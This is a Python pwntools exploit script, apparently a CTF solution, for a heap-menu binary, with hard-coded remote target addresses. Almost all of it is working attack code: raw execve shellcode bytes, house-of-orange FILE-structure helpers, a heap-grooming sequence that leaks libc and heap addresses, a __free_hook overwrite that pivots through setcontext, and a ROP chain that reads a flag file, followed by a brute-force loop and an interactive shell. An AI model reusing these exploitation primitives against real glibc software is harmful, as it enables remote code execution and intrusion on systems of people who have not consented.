# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')

local = 1
elf = ELF('./1')
if local:
    p = process('./1')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('./libc-2.31.so')
#onegadget64(libc.so.6)
#more onegadget
#one_gadget -l 200 /lib/x86_64-linux-gnu/libc.so.6
one64 = [0x45226,0x4527a,0xf0364,0xf1207]
# [rax == NULL;[rsp+0x30] == NULL,[rsp+0x50] == NULL,[rsp+0x70] == NULL]
#onegadget32(libc.so.6) 
# one32 = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]

# py32 = fmtstr_payload(start_read_offset,{xxx_got:system_addr})
# sl(py32)
# py64 = FormatStr(isx64=1)
# py64[printf_got] = onegadget
# sl(py64.payload(start_read_offset))

# shellcode = asm(shellcraft.sh())
shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    file_struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    file_struct = file_struct.ljust(0x88, "\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, "\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, "\x00")
    return file_struct

def pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr):
    payload = pack_file(_flags = 0,
                        _IO_read_ptr = 0x61, #smallbin4file_size
                        _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr,
                        _IO_write_base = 0,
                        _IO_write_ptr = 1,
                        _IO_buf_base = binsh_addr,
                        _mode = 0,
                       )
    payload += p64(_IO_str_jumps_addr-8)  # vtable
    payload += p64(0) # paddding
    payload += p64(system_addr)
    return payload

def get_io_str_jumps_offset(libc):
    IO_file_jumps_offset = libc.sym['_IO_file_jumps']
    IO_str_underflow_offset = libc.sym['_IO_str_underflow']
    for ref_offset in libc.search(p64(IO_str_underflow_offset)):
        possible_IO_str_jumps_offset = ref_offset - 0x20
        if possible_IO_str_jumps_offset > IO_file_jumps_offset:
            # print possible_IO_str_jumps_offset
            return possible_IO_str_jumps_offset

def house_of_orange_payload(libc, libc_base):
  io_str_jump = libc_base + get_io_str_jumps_offset(libc)
  io_list_all = libc_base + libc.symbols['_IO_list_all']
  system = libc_base + libc.symbols['system']
  bin_sh = libc_base + next(libc.search('/bin/sh'))
  payload = pack_file_flush_str_jumps(io_str_jump, io_list_all, system, bin_sh)
  return payload

sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def ms(name,addr):
    print name + "---->" + hex(addr)

def debug(mallocr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+mallocr)))
    else:
        gdb.attach(p,"b *{}".format(hex(mallocr)))


def add(index,size,content):
    ru("choice: ")
    sl('1')
    ru("Give me a dream ID: ")
    sl(str(index))
    ru("how long do you want to sleep:")
    sl(str(size))
    ru("content?")
    sd(content)
def free(index):
    ru("choice: ")
    sl('2')
    ru("Which dream to wake?")
    sl(str(index))

def pwn():
  add(1,0x70,'hhhh')
  add(2,0x420,'aaaa')
  add(3,0x4f8,'bbbb')
  add(4,0x4f8,'cccc')
  free(2)
  add(5,0x450,'dddd')
  py = ''
  py += p64(0) + p64(0x421)
  py += p8(0x40)
  add(6,0x21,py)
  for i in xrange(7,17,1):
    add(i,0x21,'hhhh')

  add(17,0x218,'hhhh')
  for i in xrange(10,16,1):
  	free(i)
  free(8)
  free(9)
  free(7)
  add(18,0x400,'bbbb')
  for i in xrange(10,16,1):
  	add(i,0x21,'gggg')
  add(8,0x21,'gggg')
  add(7,0x21,p64(0x21)+p8(0x20))
  add(9,0x21,p64(0x21)+p8(0x20))

  for i in xrange(10,16,1):
  	free(i)
  free(9)
  free(8)
  free(6)
  for i in xrange(10,16,1):
  	add(i,0x21,'gggg')
  add(8,0x21,'gggg')
  add(6,0x21,p8(0x20))
  add(9,0x21,p8(0x20))
  # free(3)
  free(17)
  add(17,0x218,'a'*0x210+p64(0x420))
  # debug(0x1887)
  free(3)
  add(19,0x410,'nnnn')
  add(20,0x4f8,'nnnn')
  for i in xrange(10,16,1):
  	free(i)
  free(8)
  free(16)
  free(9)
  add(21,0x400,'bbbb')
  for i in xrange(10,16,1):
  	add(i,0x21,'gggg')

  add(22,0x21,'\xa0\x86')
  # debug(0x1140)
  add(16,0x21,'\xa0\x86')
  add(23,0x21,'hhhh')

  free(11)
  free(22)
  free(10)
  free(19)
  add(19,0x410,p64(0)*3+p64(0x31)+p64(0)*5+p64(0x31)+p8(0xe0))
  add(24,0x22,'hhhh')
  add(25,0x22,'hhhh')


  add(26,0x600,'hhhh')
  add(27,0x400,'hhhh')
  free(26)
  add(28,0x700,'hhhh')
  # debug(0x1140)
  add(29,0x23,p64(0xfbad1800)+p64(0)*3+'\x00\x80')
  rc(1)
  rc(0x58)
  libc_base = u64(rc(8))-0x1ec040
  ms("libc_base--->",libc_base)

  heap_addr = u64(rc(8))
  ms("heap--->",heap_addr)

  malloc_hook = libc_base + libc.sym["__malloc_hook"]
  fake_chunk = malloc_hook - 0x23
  realloc = libc_base + libc.sym["realloc"]
  free_hook = libc_base + libc.sym["__free_hook"]
  system = libc_base + libc.sym["system"]
  binsh = libc_base + libc.search("/bin/sh").next()
  setcontext = libc_base + libc.sym["setcontext"]
  pop_rax_ret = libc_base + 0x000000000004a550 
  pop_rsi_ret = libc_base + 0x0000000000027529 
  pop_rdx_r12_ret = libc_base + 0x000000000011c1e1
  pop_rdi_ret = libc_base + 0x0000000000026b72 
  syscall_ret = libc_base + 0x0000000000066229
  magic_gadget = libc_base + 0x00000000001547a0
  #0x00000000001547a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; #call qword ptr [rdx + 0x20]; 
  ret = libc_base + 0x00000000000c1479

  pay_start = heap_addr+0x10

  def srop_pay():
      pay = ''
      pay += p64(0) + p64(pay_start)
      pay = pay.ljust(0x20,'\x00')
      pay += p64(setcontext+33)
      pay = pay.ljust(0x68,'\x00')
      pay += p64(0)
      pay += p64(pay_start)
      pay += p64(0)
      pay += p64(0)
      pay += p64(0x110)
      pay = pay.ljust(0xa0,'\x00')
      pay += p64(pay_start)
      pay += p64(syscall_ret)
      pay = pay.ljust(0xe0,'\x00')
      pay += p64(pay_start)
      return pay

  def orw_pay():
      pay = ''
      pay += p64(pop_rdi_ret)
      pay += p64(pay_start+0x100)
      pay += p64(pop_rsi_ret)
      pay += p64(0)
      pay += p64(pop_rax_ret)
      pay += p64(0x2)
      pay += p64(syscall_ret)
      pay += p64(pop_rdi_ret)
      pay += p64(3)
      pay += p64(pop_rsi_ret)
      pay += p64(heap_addr)
      pay += p64(pop_rdx_r12_ret)
      pay += p64(0x40)
      pay += p64(0)
      pay += p64(pop_rax_ret)
      pay += p64(0x0)
      pay += p64(syscall_ret)
      pay += p64(pop_rdi_ret)
      pay += p64(1)
      pay += p64(pop_rsi_ret)
      pay += p64(heap_addr)
      pay += p64(pop_rdx_r12_ret)
      pay += p64(0x40)
      pay += p64(0)
      pay += p64(pop_rax_ret)
      pay += p64(0x1)
      pay += p64(syscall_ret)
      pay = pay.ljust(0x100,'a')
      pay += './flag\x00\x00'
      return pay

  free(19)
  free(25)
  free(24)
  add(30,0x410,p64(0)*3+p64(0x31)+p64(0)*5+p64(0x31)+p64(free_hook))
  add(31,0x21,'hhhh')
  add(32,0x21,p64(magic_gadget))
  py = srop_pay()
  add(33,0x600,py)
  # debug(0x10f0)
  free(33)
  orw = orw_pay()
  sl(orw)

i = 0
while 1:
    print i
    i += 1
    try:
        pwn()
    except EOFError:
        p.close()
        local = 1
        elf = ELF('./1')
        if local:
            p = process('./1')
            libc = elf.libc
            continue
        else:
            p = remote('121.40.246.48',9999)
            libc = ELF('./libc-2.31.so')
    else:
        sl("ls")
        break
p.interactive()